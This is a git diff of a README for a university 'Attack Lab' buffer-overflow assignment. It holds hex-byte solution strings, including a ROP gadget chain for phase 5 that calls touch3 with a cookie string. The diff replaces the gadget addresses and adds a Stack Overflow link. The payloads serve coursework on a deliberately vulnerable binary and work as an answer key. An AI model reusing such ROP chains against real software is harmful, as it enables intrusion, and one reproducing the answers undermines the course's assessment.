@@ -1,8 +1,9 @@
 # Attack Lab
 See assignment details at attacklab.pdf.  
 See guide at https://github.com/magna25/Attack-Lab/.
+See also steps of phase5 at https://stackoverflow.com/questions/54602292/segmentation-fault-in-attack-lab-phase5.
 
-## Phase 1 Solution
+.## Phase 1 Solution
 ```
 // 40 bytes
 00 00 00 00 00 00 00 00
@@ -68,20 +69,18 @@ a0 16 40 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-
-
-D6 1a 40 00 00 00 00 00 /* mov %rsp,%rax == 48 89 e0 */
-2D 1a 40 00 00 00 00 00 /* mov %rax,%rdi == 48 89 c7 */
-3D 1a 40 00 00 00 00 00 /* pop rax       == 58    */
-48 00 00 00 00 00 00 00 /* offset */
-e4 1a 40 00 00 00 00 00 /* mov %eax,%edx == 89 c2 */
-0B 1a 40 00 00 00 00 00 /* mov %edx,%ecx == 89 d1 */
-FE 1a 40 00 00 00 00 00 /* mov %ecx,%esi == 89 ce */
-5a 1a 40 00 00 00 00 00 /* lea add_xy */
-2D 1a 40 00 00 00 00 00 /* mov %rax,%rdi == 48 89 c7  */
-
+// gadgets
+58 18 40 00 00 00 00 00
+0c 18 40 00 00 00 00 00
+27 18 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+e3 18 40 00 00 00 00 00
+a1 18 40 00 00 00 00 00
+bc 18 40 00 00 00 00 00
+3e 18 40 00 00 00 00 00
+0c 18 40 00 00 00 00 00
 // address of touch3
-75 27 40 00 00 00 00 00
+75 17 40 00 00 00 00 00
 // cookie
 33 37 33 63 32 35 31 66 00
 ```
